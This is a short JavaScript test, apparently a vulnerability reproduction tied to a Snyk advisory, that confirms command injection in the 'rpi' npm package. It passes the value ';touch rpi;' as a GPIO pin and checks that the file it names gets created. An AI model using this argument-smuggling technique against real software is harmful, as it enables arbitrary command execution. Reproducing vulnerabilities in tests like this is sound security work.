//https://snyk.io/vuln/SNYK-JS-RPI-548942
test("Command Injection in rpi", async () => {
  expect.assertions(2);
  const RPI = require("rpi");
  const fs = require("fs");
  const path = "./rpi";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    let pin = await new RPI.GPIO(";touch rpi;", "123");
  } catch (err) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
